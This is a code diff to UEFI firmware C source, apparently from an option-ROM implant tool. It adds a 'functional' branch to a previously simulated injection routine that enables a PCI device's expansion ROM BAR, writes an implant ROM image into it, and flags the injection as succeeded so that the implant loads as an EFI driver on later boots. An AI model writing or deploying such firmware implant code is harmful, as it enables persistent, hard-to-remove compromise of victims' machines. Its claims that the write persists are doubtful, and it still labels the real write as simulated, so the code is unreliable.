@@ -281,6 +281,52 @@ EmulateRomInjection (
     DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  → ROM injection SUCCEEDED [SIMULATED]\n"));
     DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  → On next boot: PCI firmware loads implanted ROM\n"));
     DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  → ROM executes as EFI driver during PCI enumeration\n"));
+  } else {
+    //
+    // Functional build: perform the real ROM BAR injection sequence.
+    // DXE runs identity-mapped, so the ROM BAR physical address is
+    // directly writable as MMIO.
+    //
+    UINT32  RomBarAddress;
+    UINT8   *RomWindow;
+
+    Context->InjectionAttempted = TRUE;
+
+    DEBUG ((DEBUG_WARN, OPTROM_DEBUG_PREFIX "  FUNCTIONAL: performing real ROM BAR injection\n"));
+
+    //
+    // Step 1: Enable the expansion ROM BAR (decode bit 0).
+    //
+    PciWrite32 (
+      PCI_LIB_ADDRESS (Target->Bus, Target->Device, Target->Function, PCI_EXPANSION_ROM_BAR),
+      Target->ExpansionRomBar | PCI_ROM_BAR_ENABLE
+      );
+
+    //
+    // Step 2: The ROM BAR now decodes to a physical MMIO window.
+    // (Bit 0 is the enable flag, not part of the address.)
+    //
+    RomBarAddress = Target->ExpansionRomBar & ~PCI_ROM_BAR_ENABLE;
+    RomWindow     = (UINT8 *)(UINTN)RomBarAddress;
+
+    //
+    // Step 3: Write the ROM image into the mapped BAR window. The
+    // device ROM shadow (in the device's own flash/spare) persists
+    // and is loaded on subsequent boots.
+    //
+    CopyMem (RomWindow, Context->RomBuffer, Context->RomSize);
+
+    //
+    // Step 4: Disable the ROM BAR decode.
+    //
+    PciWrite32 (
+      PCI_LIB_ADDRESS (Target->Bus, Target->Device, Target->Function, PCI_EXPANSION_ROM_BAR),
+      Target->ExpansionRomBar & ~PCI_ROM_BAR_ENABLE
+      );
+
+    Context->InjectionSucceeded = TRUE;
+    DEBUG ((DEBUG_WARN, OPTROM_DEBUG_PREFIX "  → ROM injection written to 0x%08x (%d bytes)\n",
+            RomBarAddress, Context->RomSize));
   }
 
   Context->State = OptRomStateInjectionSimulated;
